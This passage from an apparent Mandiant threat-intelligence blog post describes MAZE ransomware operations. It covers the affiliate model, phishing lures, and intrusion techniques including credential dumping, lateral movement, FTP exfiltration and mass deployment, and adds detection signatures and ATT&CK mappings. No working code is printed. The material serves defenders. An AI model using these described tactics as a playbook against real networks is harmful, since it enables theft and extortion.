  post-compromise. Multiple actors are involved in MAZE ransomware
  operations, based on our observations of alleged users in underground
  forums and distinct tactics, techniques, and procedures across
  Mandiant incident response engagements. Actors behind MAZE also
  maintain a public-facing website where they post data stolen from
  victims who refuse to pay an extortion fee.</p>
 <p>The combination of these two damaging intrusion outcomes—dumping
  sensitive data and disrupting enterprise networks—with a criminal
  service makes MAZE a notable threat to many organizations. This blog
  post is based on information derived from numerous Mandiant incident
  response engagements and our own research into the MAZE ecosystem and operations.</p>
 <p>Mandiant Threat Intelligence will be available to answer questions
  on the <a href="https://www.brighttalk.com/webcast/10469/408167">MAZE
    ransomware threat in a May 21 webinar</a>.</p>
 <h4>Victimology</h4>
 <p>We are aware of more than 100 alleged MAZE victims reported by
  various media outlets and on the MAZE website since November 2019.
  These organizations have been primarily based in North America,
  although victims spanned nearly every geographical region. Nearly
  every industry sector including manufacturing, legal, financial
  services, construction, healthcare, technology, retail, and government
  has been impacted demonstrating that indiscriminate nature of these
  operations (Figure 1).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Geographical and industry
    distribution of alleged MAZE victims</span></p>
 <h4>Multiple Actors Involved in MAZE Ransomware Operations Identified</h4>
 <p>Mandiant identified multiple Russian-speaking actors who claimed to
  use MAZE ransomware and were seeking partners to fulfill different
  functional roles within their teams. Additional information on these
  actors is available to <a
    href="https://www.fireeye.com/solutions/cyber-threat-intelligence/threat-intelligence-subscriptions.html">Mandiant
    Intelligence subscribers</a>. A panel used to manage victims
  targeted for MAZE ransomware deployment has a section for affiliate
  transactions. This activity is consistent with our assessment that
  MAZE operates under an affiliate model and is not distributed by a
  single group. Under this business model, ransomware developers will
  partner with other actors (i.e. affiliates) who are responsible for
  distributing the malware. In these scenarios, when a victim pays the
  ransom demand, the ransomware developers receive a commission. Direct
  affiliates of MAZE ransomware also partner with other actors who
  perform specific tasks for a percentage of the ransom payment. This
  includes partners who provide initial access to organizations and
  pentesters who are responsible for reconnaissance, privilege
  escalation and lateral movement—each of which who appear to work on a
  percentage-basis. Notably, in some cases, actors may be hired on a
  salary basis (vs commission) to perform specific tasks such as
  determining the victim organization and its annual revenues. This
  allows for specialization within the cyber criminal ecosystem,
  ultimately increasing efficiency, while still allowing all parties
  involved to profit.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: MAZE ransomware panel</span></p>
 <h4>MAZE Initially Distributed via Exploit Kits and Spam Campaigns</h4>
 <p>MAZE ransomware was initially distributed directly via <a
    href="https://www.bleepingcomputer.com/news/security/maze-ransomware-says-computer-type-determines-ransom-amount/">exploit
  kits</a> and <a
    href="https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us">spam
  campaigns</a> through late 2019. For example, in November 2019,
  Mandiant observed multiple email campaigns delivering Maze ransomware
  primarily to individuals at organizations in Germany and the United
  States, although a significant number of emails were also delivered to
  entities in Canada, Italy, and South Korea. These emails used tax,
  invoice, and package delivery themes with document attachments or
  inline links to documents which download and execute Maze ransomware.</p>
 <p>On November 6 and 7, a Maze campaign targeting Germany delivered
  macro-laden documents using the subject lines “Wichtige informationen
  uber Steuerruckerstattung” and “1&amp;1 Internet AG - Ihre Rechnung
  19340003422 vom 07.11.19” (Figure 3). Recipients included individuals
  at organizations in a wide range of industries, with the Financial
  Services, Healthcare, and Manufacturing sectors being targeted most
  frequently. These emails were sent using a number of malicious domains
  created with the registrant address gladkoff1991@yandex.ru.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: German-language lure</span></p>
 <p>On November 8, a campaign delivered Maze primarily to Financial
  Services and Insurance organizations located in the United states.
  These emails originated from a compromised or spoofed account and
  contained an inline link to download a Maze executable payload.</p>
 <p>On November 18 and 19, a Maze campaign targeted individuals
  operating in a range of industries in the United States and Canada
  with macro documents using phone bill and package delivery themes
  (Figure 4 and Figure 5). These emails used the subjects “Missed
  package delivery” and &quot;Your AT&amp;T wireless bill is ready to
  view&quot; and were sent using a number of malicious domains with the
  registrant address abusereceive@hitler.rocks. Notably, this registrant
  address was also used to create multiple Italian-language domains
  towards the end of November 2019.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: AT&amp;T email lure</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Canada Post email lure</span></p>
 <h4>Shift to Post-Compromise Distribution Maximizes Impact</h4>
 <p>Actors using MAZE have increasingly shifted to deploying the
  ransomware post-compromise. This methodology provides an opportunity
  to infect more hosts within a victim’s environment and exfiltrate
  data, which is leveraged to apply additional pressure on organizations
  to pay extortion fees. Notably, in at least some cases, the actors
  behind these operations charge an additional fee, in addition to the
  decryption key, for the non-release of stolen data.</p>
 <p>Although the high-level intrusion scenarios preceding the
  distribution of MAZE ransomware are broadly similar, there have been
  notable variations across intrusions that suggest attribution to
  distinct teams. Even within these teams, the cyber criminals appear to
  be task-oriented meaning that one operator is not responsible for the
  full lifecycle. The following sections highlight the TTPs seen in a
  subset of incidents and serve to illustrate the divergence that may
  occur due to the fact that numerous, disparate actors are involved in
  different phases of these operations. Notably, the time between
  initial compromise to encryption has also been widely varied, from
  weeks to many months.</p>
 <p>
  <i>Initial Compromise</i></p>
 <p>There are few clear patterns for intrusion vector across analyzed
  MAZE ransomware incidents. This is consistent with our observations of
  multiple actors who use MAZE soliciting partners with network access.
  The following are a sample of observations from several Mandiant
  incident response engagements:</p>
 <ul> <li>A user downloaded a malicious resume-themed Microsoft Word
    document that contained macros which launched an IcedID payload,
    which was ultimately used to execute an instance of BEACON.</li>
    <li>An actor logged into an internet-facing system via RDP. The
    account used to grant initial access was a generic support account.
    It is unclear how the actor obtained the account's password.</li>
    <li>An actor exploited a misconfiguration on an Internet-facing
    system. This access enabled the actor to deploy tools to pivot into
    the internal network.</li> <li>An actor logged into a Citrix web
    portal account with a weak password. This authenticated access
    enabled the actor to launch a Meterpreter payload on an internal
  system.</li> </ul>
 <p>
  <i>Establish Foothold &amp; Maintain Presence</i></p>
 <p>The use of legitimate credentials and broad distribution of BEACON
  across victim environments appear to be consistent approaches used by
  actors to establish their foothold in victim networks and to maintain
  presence as they look to meet their ultimate objective of deploying
  MAZE ransomware. Despite these commonplace behaviors, we have observed
  an actor create their own domain account to enable latter-stage operations.</p>
 <ul> <li>Across multiple incidents, threat actors deploying MAZE
    established a foothold in victim environments by installing BEACON
    payloads on many servers and workstations.</li> <li>Web shells were
    deployed to an internet-facing system. The system level access
    granted by these web shells was used to enable initial privilege
    escalation and the execution of a backdoor.</li> <li>Intrusion
    operators regularly obtained and maintained access to multiple
    domain and local system accounts with varying permissions that were
    used throughout their operations.</li> <li>An actor created a new
    domain account and added it to the domain administrators group.</li> </ul>
 <p>
  <i>Escalate Privileges</i></p>
 <p>Although Mandiant has observed multiple cases where MAZE intrusion
  operators employed Mimikatz to collect credentials to enable privilege
  escalation, these efforts have also been bolstered in multiple cases
  via use of Bloodhound, and more manual searches for files containing credentials.</p>
 <ul> <li>Less than two weeks after initial access, the actor downloaded
    and interacted with an archive named <i>mimi.zip</i>, which
    contained files corresponding to the credential harvesting tool
    Mimikatz. In the following days the same <i>mimi.zip</i> archive was
    identified on two domain controllers in the impacted
  environment.</li> <li>The actor attempted to find files with the word
    “password” within the environment. Additionally, several archive
    files were also created with file names suggestive of credential
    harvesting activity.</li> <li>The actor attempted to identify hosts
    running the KeePass password safe software.</li> <li>Across multiple
    incidents, the Bloodhound utility was used, presumably to assess
    possible methods of obtaining credentials with domain administrator
  privileges.</li> <li>Actors primarily used Procdump and Mimikatz to
    collect credentials used to enable later stages of their intrusion.
    Notably, both Bloodhound and PingCastle were also used, presumably
    to enable attackers' efforts to understand the impacted
    organization's Active Directory configuration. In this case the
    responsible actors also attempted to exfiltrate collected
    credentials to multiple different cloud file storage services.</li> </ul>
 <p>
  <i>Reconnaissance</i></p>
 <p>Mandiant has observed a broad range of approaches to network, host,
  data, and Active Directory reconnaissance across observed MAZE
  incidents. The varied tools and approaches across these incidents
  maybe best highlights the divergent ways in which the responsible
  actors interact with victim networks.</p>
 <ul> <li>In some intrusions, reconnaissance activity occurred within
    three days of gaining initial access to the victim network. The
    responsible actor executed a large number of reconnaissance scripts
    via Cobalt Strike to collect network, host, filesystem, and domain
    related information.</li> <li>Multiple built-in Windows commands
    were used to enable network, account, and host reconnaissance of the
    impacted environment, though the actors also supplied and used
    Advanced IP Scanner and Adfind to support this stage of their
  operations.</li> <li>Preliminary network reconnaissance has been
    conducted using a batch script named '2.bat' which contained a
    series of nslookup commands. The output of this script was copied
    into a file named '2.txt'.</li> <li>The actor exfiltrated
    reconnaissance command output data and documents related to the IT
    environment to an attacker-controlled FTP server via an encoded
    PowerShell script.</li> <li>Over a period of several days, an actor
    conducted reconnaissance activity using Bloodhound,
    PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance
    script designed to enumerate directories across internal hosts.</li>
    <li>An actor employed the adfind tool and a batch script to collect
    information about their network, hosts, domain, and users. The
    output from this batch script (2adfind.bat) was saved into an
    archive named 'ad.7z' using an instance of the 7zip archiving
    utility named <i>7.exe</i>.</li> <li>An actor used the tool
    <i>smbtools.exe </i>to assess whether accounts could login to
    systems across the environment.</li> <li>An actor collected
    directory listings from file servers across an impacted environment.
    Evidence of data exfiltration was observed approximately one month
    later, suggesting that the creation of these directory listings may
    have been precursor activity, providing the actors with data they
    may have used to identify sensitive data for future
  exfiltration.</li> </ul>
 <p>
  <i>Lateral Movement</i></p>
 <p>Across the majority of MAZE ransomware incidents lateral movement
  was accomplished via Cobalt Strike BEACON and using previously
  harvested credentials. Despite this uniformity, some alternative tools
  and approaches were also observed.</p>
 <ul> <li>Attackers relied heavily on Cobalt Strike BEACON to move
    laterally across the impacted environment, though they also tunneled
    RDP using the ngrok utility, and employed tscon to hijack legitimate
    rdp sessions to enable both lateral movement and privilege
  escalation.</li> <li>The actor moved laterally throughout some
    networks leveraging compromised service and user accounts obtained
    from the system on which they gained their initial foothold. This
    allowed them to obtain immediate access to additional systems.
    Stolen credentials were then used to move laterally across the
    network via RDP and to install BEACON payloads providing the actors
    with access to nearly one hundred hosts.</li> <li>An actor moved
    laterally using Metasploit and later deployed a Cobalt Strike
    payload to a system using a local administrator account.</li> <li>At
    least one actor attempted to perform lateral movement using
    EternalBlue in early and late 2019; however, there is no evidence
    that these attempts were successful.</li> </ul>
 <p>
  <i>Complete Mission</i></p>
 <p>There was evidence suggesting data exfiltration across most analyzed
  MAZE ransomware incidents. While malicious actors could monetize
  stolen data in various way (e.g. sale in an underground forum, fraud),
  actors employing MAZE are known to threaten the release of stolen data
  if victim organizations do not pay an extortion fee.</p>
 <ul> <li>An actor has been observed exfiltrating data to FTP servers
    using a base64-encoded PowerShell script designed to upload any
    files with .7z file extensions to a predefined FTP server using a
    hard-coded username and password. This script appears to be a slight
    variant of a <a>script first posted</a> to Microsoft TechNet in
  2013.</li> <li>A different base64-encoded PowerShell command was also
    used to enable this functionality in a separate incident.</li>
    <li>Actors deploying MAZE ransomware have also used the utility
    WinSCP to exfiltrate data to an attacker-controlled FTP server.</li>
    <li>An actor has been observed employing a file replication utility
    and copying the stolen data to a cloud file hosting/sharing
  service.</li> <li>Prior to deploying MAZE ransomware threat actors
    employed the 7zip utility to archive data from across various
    corporate file shares. These archives were then exfiltrated to an
    attacker-controlled server via FTP using the WinSCP utility.</li> </ul>
 <p>In addition to data theft, actors deploy MAZE ransomware to encrypt
  files identified on the victim network. Notably, the aforementioned
  MAZE panel has an option to specify the date on which ransom demands
  will double, likely to create a sense of urgency to their demands.</p>
 <ul> <li>Five days after data was exfiltrated from a victim environment
    the actor copied a MAZE ransomware binary to 15 hosts within the
    victim environment and successfully executed it on a portion of
    these systems.</li> <li>Attackers employed batch scripts and a
    series to txt files containing host names to distribute and execute
    MAZE ransomware on many servers and workstations across the victim
  environment.</li> <li>An actor deployed MAZE ransomware to tens of
    hosts, explicitly logging into each system using a domain
    administrator account created earlier in the intrusion.</li>
    <li>Immediately following the exfiltration of sensitive data, the
    actors began deployment of MAZE ransomware to hosts across the
    network. In some cases, thousands of hosts were ultimately
    encrypted. The encryption process proceeded as follows:<ul> <li>A
        batch script named <i>start.bat</i> was used to execute a series
        of secondary batch scripts with names such as <i>xaa3x.bat</i>
        or <i>xab3x.bat</i>.</li> <li>Each of these batch scripts
        contained a series of commands that employed the copy command,
        WMIC, and PsExec to copy and execute a kill script (windows.bat)
        and an instance of MAZE ransomware (sss.exe) on hosts across the
        impacted environment</li> <li>Notably, forensic analysis of the
        impacted environment revealed MAZE deployment scripts targeting
        ten times as many hosts as were ultimately encrypted.</li> </ul>
  </li> </ul>
 <h4>Implications</h4>
 <p>Based on our belief that the MAZE ransomware is distributed by
  multiple actors, we anticipate that the TTPs used throughout incidents
  associated with this ransomware will continue to vary somewhat,
  particularly in terms of the initial intrusion vector. For more
  comprehensive recommendations for addressing ransomware, please refer
  to our <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html">Ransomware
    Protection and Containment Strategies</a> blog post and the linked
    <a
    href="https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wp-ransomware-protection-and-containment-strategies.pdf">white paper</a>.</p>
 <h4>Mandiant Security Validation Actions</h4>
 <p>Organizations can validate their security controls against more than
  20 MAZE-specific actions with <a
    href="https://www.fireeye.com/solutions/verodin-security-instrumentation.html">Mandiant
    Security Validation</a>. Please see our Headline Release Content
  Updates – April 21, 2020 on the <a
    href="https://customer.verodin.com/">Mandiant Security Validation
    Customer Portal</a> for more information.</p>
 <ul> <li>A100-877 - Active Directory - BloodHound, CollectionMethod
  All</li> <li>A150-006 - Command and Control - BEACON, Check-in</li>
    <li>A101-030 - Command and Control - MAZE Ransomware, C2 Beacon,
    Variant #1</li> <li>A101-031 - Command and Control - MAZE
    Ransomware, C2 Beacon, Variant #2</li> <li>A101-032 - Command and
    Control - MAZE Ransomware, C2 Beacon, Variant #3</li> <li>A100-878 -
    Command and Control - MAZE Ransomware, C2 Check-in</li> <li>A100-887
    - Command and Control - MAZE, DNS Query #1</li> <li>A100-888 -
    Command and Control - MAZE, DNS Query #2</li> <li>A100-889 - Command
    and Control - MAZE, DNS Query #3</li> <li>A100-890 -  Command and
    Control - MAZE, DNS Query #4</li> <li>A100-891 - Command and Control
    - MAZE, DNS Query #5</li> <li>A100-509 - Exploit Kit Activity -
    Fallout Exploit Kit CVE-2018-8174, Github PoC</li> <li>A100-339 -
    Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Landing
  Page</li> <li>A101-033 - Exploit Kit Activity - Spelevo Exploit Kit,
    MAZE C2</li> <li>A100-208 - FTP-based Exfil/Upload of PII Data
    (Various Compression)</li> <li>A104-488 - Host CLI - Collection,
    Exfiltration: Active Directory Reconnaissance with SharpHound,
    CollectionMethod All</li> <li>A104-046 - Host CLI - Collection,
    Exfiltration: Data from Local Drive using PowerShell</li>
    <li>A104-090 - Host CLI - Collection, Impact: Creation of a Volume
    Shadow Copy</li> <li>A104-489 - Host CLI - Collection: Privilege
    Escalation Check with PowerUp, Invoke-AllChecks</li> <li>A104-037 -
    Host CLI - Credential Access, Discovery: File &amp; Directory
  Discovery</li> <li>A104-052 - Host CLI - Credential Access:
  Mimikatz</li> <li>A104-167 - Host CLI - Credential Access: Mimikatz
  (2.1.1)</li> <li>A104-490 - Host CLI - Defense Evasion, Discovery:
    Terminate Processes, Malware Analysis Tools</li> <li>A104-491 - Host
    CLI - Defense Evasion, Persistence: MAZE, Create Target.lnk</li>
    <li>A104-500 - Host CLI - Discovery, Defense Evasion: Debugger
  Detection</li> <li>A104-492 - Host CLI - Discovery, Execution:
    Antivirus Query with WMI, PowerShell</li> <li>A104-374 - Host CLI -
    Discovery: Enumerate Active Directory Forests</li> <li>A104-493 -
    Host CLI - Discovery: Enumerate Network Shares</li> <li>A104-481 -
    Host CLI - Discovery: Language Query Using PowerShell, Current
  User</li> <li>A104-482 - Host CLI - Discovery: Language Query Using
    reg query</li> <li>A104-494 - Host CLI - Discovery: MAZE, Dropping
    Ransomware Note Burn Directory</li> <li>A104-495 - Host CLI -
    Discovery: MAZE, Traversing Directories and Dropping Ransomware
    Note, DECRYPT-FILES.html Variant</li> <li>A104-496 - Host CLI -
    Discovery: MAZE, Traversing Directories and Dropping Ransomware
    Note, DECRYPT-FILES.txt Variant</li> <li>A104-027 - Host CLI -
    Discovery: Process Discovery</li> <li>A104-028 - Host CLI -
    Discovery: Process Discovery with PowerShell</li> <li>A104-029 -
    Host CLI - Discovery: Remote System Discovery</li> <li>A104-153 -
    Host CLI - Discovery: Security Software Identification with
  Tasklist</li> <li>A104-083 - Host CLI - Discovery: System Info</li>
    <li>A104-483 - Host CLI - Exfiltration: PowerShell FTP Upload</li>
    <li>A104-498 - Host CLI - Impact: MAZE, Desktop Wallpaper Ransomware
  Message</li> <li>A104-227 - Host CLI - Initial Access, Lateral
    Movement: Replication Through Removable Media</li> <li>A100-879 -
    Malicious File Transfer - Adfind.exe, Download</li> <li>A150-046 -
    Malicious File Transfer - BEACON, Download</li> <li>A100-880 -
    Malicious File Transfer - Bloodhound Ingestor Download, C Sharp
    Executable Variant</li> <li>A100-881 - Malicious File Transfer -
    Bloodhound Ingestor Download, C Sharp PowerShell Variant</li>
    <li>A100-882 - Malicious File Transfer - Bloodhound Ingestor
    Download, PowerShell Variant</li> <li>A101-037 - Malicious File
    Transfer - MAZE Download, Variant #1</li> <li>A101-038 - Malicious
    File Transfer - MAZE Download, Variant #2</li> <li>A101-039 -
    Malicious File Transfer - MAZE Download, Variant #3</li>
    <li>A101-040 - Malicious File Transfer - MAZE Download, Variant
  #4</li> <li>A101-041 - Malicious File Transfer - MAZE Download,
    Variant #5</li> <li>A101-042 - Malicious File Transfer - MAZE
    Download, Variant #6</li> <li>A101-043 - Malicious File Transfer -
    MAZE Download, Variant #7</li> <li>A101-044 - Malicious File
    Transfer - MAZE Download, Variant #8</li> <li>A101-045 - Malicious
    File Transfer - MAZE Download, Variant #9</li> <li>A101-034 -
    Malicious File Transfer - MAZE Dropper Download, Variant #1</li>
    <li>A101-035 - Malicious File Transfer - MAZE Dropper Download,
    Variant #2</li> <li>A100-885 - Malicious File Transfer - MAZE
    Dropper Download, Variant #4</li> <li>A101-036 - Malicious File
    Transfer - MAZE Ransomware, Malicious Macro, PowerShell Script
  Download</li> <li>A100-284 - Malicious File Transfer - Mimikatz W/
    Padding (1MB), Download</li> <li>A100-886 - Malicious File Transfer
    - Rclone.exe, Download</li> <li>A100-484 - Scanning Activity - Nmap
    smb-enum-shares, SMB Share Enumeration</li> </ul>
 <h4>Detecting the Techniques</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Platform</b></p> </td> <td width="312" valign="top"><p>
          <b>Signature Name</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>MVX (covers multiple FireEye technologies)</b></p> </td>
        <td width="312" valign="top"><p>Bale Detection</p>
        <p>FE_Ransomware_Win_MAZE_1</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Endpoint Security</b></p> </td> <td width="312"
          valign="top"><p>WMIC SHADOWCOPY DELETE (METHODOLOGY)</p>
          <p>MAZE RANSOMWARE (FAMILY)</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Network Security</b></p> </td> <td width="312"
        valign="top"><p>Ransomware.Win.MAZE</p> <p>Ransomware.Maze</p>
        <p>Ransomware.Maze</p> </td> </tr></tbody></table>
 <h4>MITRE ATT&amp;CK Mappings</h4>
 <p>Mandiant currently tracks three separate clusters of activity
  involved in the post-compromise distribution of MAZE ransomware.
  Future data collection and analysis efforts may reveal additional
  groups involved in intrusion activity supporting MAZE operations, or
  may instead allow us to collapse some of these groups into larger
  clusters. It should also be noted that ‘initial access’ phase
  techniques have been included in these mappings, though in some cases
  this access may have been provided by a separate threat actor(s).</p>
 <h4>MAZE Group 1 MITRE ATT&amp;CK Mapping</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>ATT&amp;CK Tactic Category</b></p> </td> <td width="312" valign="top"><p>
          <b>Techniques</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Initial Access</b></p> </td> <td width="312"
          valign="top"><p>T1133: External Remote Services</p> <p>T1078:
          Valid Accounts</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Execution</b></p> </td> <td width="312"
          valign="top"><p>T1059: Command-Line Interface</p> <p>T1086:
        PowerShell</p> <p>T1064: Scripting</p> <p>T1035: Service
        Execution</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Persistence</b></p> </td> <td width="312"
          valign="top"><p>T1078: Valid Accounts</p> <p>T1050: New
        Service</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Privilege Escalation</b></p> </td> <td width="312"
          valign="top"><p>T1078: Valid Accounts</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Defense Evasion</b></p> </td> <td width="312"
          valign="top"><p>T1078: Valid Accounts</p> <p>T1036:
        Masquerading</p> <p>T1027: Obfuscated Files or Information</p>
          <p>T1064: Scripting</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Credential Access</b></p> </td> <td width="312"
          valign="top"><p>T1110: Brute Force</p> <p>T1003: Credential
        Dumping</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Discovery</b></p> </td> <td width="312"
          valign="top"><p>T1087: Account Discovery</p> <p>T1482: Domain
          Trust Discovery</p> <p>T1083: File and Directory Discovery</p>
          <p>T1135: Network Share Discovery</p> <p>T1069: Permission
          Groups Discovery</p> <p>T1018: Remote System Discovery</p>
          <p>T1016: System Network Configuration Discovery</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Lateral Movement</b></p> </td> <td width="312"
          valign="top"><p>T1076: Remote Desktop Protocol</p> <p>T1105:
          Remote File Copy</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Collection</b></p> </td> <td width="312"
          valign="top"><p>T1005: Data from Local System</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Command and Control</b></p> </td> <td width="312"
          valign="top"><p>T1043: Commonly Used Port</p> <p>T1105: Remote
          File Copy</p> <p>T1071: Standard Application Layer
        Protocol</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Exfiltration</b></p> </td> <td width="312"
          valign="top"><p>T1002: Data Compressed</p> <p>T1048:
          Exfiltration Over Alternative Protocol</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Impact</b></p> </td> <td width="312" valign="top"><p>T1486:
          Data Encrypted for Impact</p> <p>T1489: Service Stop</p> </td> </tr></tbody></table>
 <h4>MAZE Group 2 MITRE ATT&amp;CK Mapping</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>ATT&amp;CK Tactic Category</b></p> </td> <td width="312" valign="top"><p>
          <b>Techniques</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Initial Access</b></p> </td> <td width="312"
          valign="top"><p>T1193: Spearphishing Attachment</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Execution</b></p> </td> <td width="312"
          valign="top"><p>T1059: Command-Line Interface</p> <p>T1086:
        PowerShell</p> <p>T1085: Rundll32</p> <p>T1064: Scripting</p>
          <p>T1204: User Execution</p> <p>T1028: Windows Remote
        Management</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Persistence</b></p> </td> <td width="312"
          valign="top"><p>T1078: Valid Accounts</p> <p>T1050: New
        Service</p> <p>T1136: Create Account</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Privilege Escalation</b></p> </td> <td width="312"
          valign="top"><p>T1078: Valid Accounts</p> <p>T1050: New
        Service</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Defense Evasion</b></p> </td> <td width="312"
          valign="top"><p>T1078: Valid Accounts</p> <p>T1140:
          Deobfuscate/Decode Files or Information</p> <p>T1107: File
        Deletion</p> <p>T1036: Masquerading</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Credential Access</b></p> </td> <td width="312"
          valign="top"><p>T1003: Credential Dumping</p> <p>T1081:
          Credentials in Files</p> <p>T1171: LLMNR/NBT-NS Poisoning</p>
      </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Discovery</b></p> </td> <td width="312"
          valign="top"><p>T1087: Account Discovery</p> <p>T1482: Domain
          Trust Discovery</p> <p>T1083: File and Directory Discovery</p>
          <p>T1135: Network Share Discovery</p> <p>T1069: Permission
          Groups Discovery</p> <p>T1018: Remote System Discovery</p>
          <p>T1033: System Owner/User Discovery</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Lateral Movement</b></p> </td> <td width="312"
          valign="top"><p>T1076: Remote Desktop Protocol</p> <p>T1028:
          Windows Remote Management</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Collection</b></p> </td> <td width="312"
          valign="top"><p>T1074: Data Staged</p> <p>T1005: Data from
          Local System</p> <p>T1039: Data from Network Shared Drive</p>
      </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Command and Control</b></p> </td> <td width="312"
          valign="top"><p>T1043: Commonly Used Port</p> <p>T1219: Remote
          Access Tools</p> <p>T1105: Remote File Copy</p> <p>T1071:
          Standard Application Layer Protocol</p> <p>T1032: Standard
          Cryptographic Protocol</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Exfiltration</b></p> </td> <td width="312"
          valign="top"><p>T1020: Automated Exfiltration</p> <p>T1002:
          Data Compressed</p> <p>T1048: Exfiltration Over Alternative
        Protocol</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Impact</b></p> </td> <td width="312" valign="top"><p>T1486:
          Data Encrypted for Impact</p> </td> </tr></tbody></table>
 <h4>MAZE Group 3 MITRE ATT&amp;CK Mapping (FIN6)</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>ATT&amp;CK Tactic Category</b></p> </td> <td width="312" valign="top"><p>
          <b>Techniques</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Initial Access</b></p> </td> <td width="312"
          valign="top"><p>T1133: External Remote Services</p> <p>T1078:
          Valid Accounts</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Execution</b></p> </td> <td width="312"
          valign="top"><p>T1059: Command-Line Interface</p> <p>T1086:
        PowerShell</p> <p>T1064: Scripting</p> <p>T1035: Service
        Execution</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Persistence</b></p> </td> <td width="312"
          valign="top"><p>T1078: Valid Accounts</p> <p>T1031: Modify
          Existing Service</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Privilege Escalation</b></p> </td> <td width="312"
          valign="top"><p>T1055: Process Injection</p> <p>T1078: Valid
        Accounts</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Defense Evasion</b></p> </td> <td width="312"
          valign="top"><p>T1055: Process Injection</p> <p>T1078: Valid
        Accounts</p> <p>T1116: Code Signing</p> <p>T1089: Disabling
          Security Tools</p> <p>T1202: Indirect Command Execution</p>
          <p>T1112: Modify Registry</p> <p>T1027: Obfuscated Files or
        Information</p> <p>T1108: Redundant Access</p> <p>T1064:
        Scripting</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Credential Access</b></p> </td> <td width="312"
          valign="top"><p>T1003: Credential Dumping</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Discovery</b></p> </td> <td width="312"
          valign="top"><p>T1087: Account Discovery</p> <p>T1482: Domain
          Trust Discovery</p> <p>T1083: File and Directory Discovery</p>
          <p>T1069: Permission Groups Discovery</p> <p>T1018: Remote
          System Discovery</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Lateral Movement</b></p> </td> <td width="312"
          valign="top"><p>T1097: Pass the Ticket</p> <p>T1076: Remote
          Desktop Protocol</p> <p>T1105: Remote File Copy</p> <p>T1077:
          Windows Admin Shares</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Collection</b></p> </td> <td width="312"
          valign="top"><p>T1074: Data Staged</p> <p>T1039: Data from
          Network Shared Drive</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Command and Control</b></p> </td> <td width="312"
          valign="top"><p>T1043: Commonly Used Port</p> <p>T1219: Remote
          Access Tools</p> <p>T1105: Remote File Copy</p> <p>T1071:
          Standard Application Layer Protocol</p> <p>T1032: Standard
          Cryptographic Protocol</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Exfiltration</b></p> </td> <td width="312"
          valign="top"><p>T1002: Data Compressed</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>Impact</b></p> </td> <td width="312" valign="top"><p>T1486:
